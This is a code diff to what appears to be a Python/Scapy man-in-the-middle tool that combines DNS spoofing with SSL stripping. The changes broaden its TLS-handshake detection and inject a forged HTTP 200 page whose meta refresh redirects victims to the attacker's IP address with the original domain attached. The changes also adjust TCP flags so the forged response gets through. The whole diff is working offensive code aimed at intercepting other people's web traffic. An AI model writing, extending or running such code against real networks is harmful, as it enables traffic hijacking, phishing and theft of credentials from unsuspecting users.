@@ -85,7 +85,7 @@ def handle_incoming_packet(packet):
             domain = None
             if packet.haslayer(Raw):
                 raw_payload = bytes(packet[TCP].payload)
-                if raw_payload.startswith(b"\x16\x03"):  # TLS Handshake
+                if raw_payload[:1] == b'\x16' and raw_payload[1:3] in [b'\x03\x00', b'\x03\x01', b'\x03\x02', b'\x03\x03', b'\x03\x04']: # TLS Handshake
                     with dns_targets_lock:
                         for target_domain, redirect_ip in dns_targets.items():
                             if get_mac(packet[IP].dst):  # check we spoofed this domain
@@ -104,12 +104,26 @@ def handle_incoming_packet(packet):
 
 def redirect_http(packet, domain):
     try:
+        redirect_html = f"""
+        <html>
+        <head>
+            <meta http-equiv="refresh" content="0; url=http://{attacker_ip}/?original_host={domain}">
+        </head>
+        <body>
+            <p>Redirecting to <a href="http://{attacker_ip}/?original_host={domain}">http://{attacker_ip}</a>...</p>
+        </body>
+        </html>
+        """.strip()
+
         http_response = (
-            f"HTTP/1.1 301 Moved Permanently\r\n"
-            f"Location: http://{domain}/\r\n"
-            f"Content-Length: 0\r\n"
-            f"Connection: close\r\n\r\n"
+            "HTTP/1.1 200 OK\r\n"
+            "Content-Type: text/html\r\n"
+            f"Content-Length: {len(redirect_html)}\r\n"
+            "Connection: close\r\n\r\n"
+            f"{redirect_html}"
         )
+
+        log_info(f"[SSL Strip] Redirecting {packet[IP].src} to {domain} via HTTP 200")
 
         ether = Ether(src=attacker_mac, dst=packet[Ether].src)
         ip = IP(src=packet[IP].dst, dst=packet[IP].src)
@@ -118,13 +132,16 @@ def redirect_http(packet, domain):
             dport=packet[TCP].sport,
             seq=packet[TCP].ack,
             ack=packet[TCP].seq + len(packet[TCP].payload),
-            flags="FA"
+            flags="PA"  # Push + ACK
+
         )
 
         sendp(ether/ip/tcp/http_response, iface=conf.iface, verbose=False)
-        log_info(f"[SSL Strip] Sent HTTP redirect to {packet[IP].src} for {domain}")
+        log_info(f"[SSL Strip] Sent fake HTTP 200 redirect to {packet[IP].src} for {domain}")
+
     except Exception as e:
         log_error(f"Failed to send SSL strip redirect: {str(e)}")
+
 
 
 def dns_spoof(packet, redirect_ip):
